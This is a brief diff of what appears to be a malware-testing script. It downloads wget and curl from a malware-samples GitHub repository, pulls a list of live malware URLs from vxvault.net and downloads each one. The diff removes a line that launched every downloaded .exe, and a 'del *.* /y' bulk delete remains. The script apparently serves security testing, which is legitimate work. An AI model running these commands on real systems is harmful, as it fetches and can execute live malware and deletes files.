@@ -111,8 +111,7 @@ cd c:\temp
 Invoke-WebRequest -Uri https://github.com/andrefernandes86/tools-malware-samples-win/raw/main/wget.exe
 Invoke-WebRequest -Uri https://github.com/andrefernandes86/tools-malware-samples-win/raw/main/curl.exe
 curl http://vxvault.net/URL_List.php > urls.txt
-wget -i urls.txt --tries=1 --timeout=5
-for i in *.exe; do start "$i"; done
+wget -i urls.txt --tries=1 --timeout=2
 del *.* /y
 DisplayMenu
 }
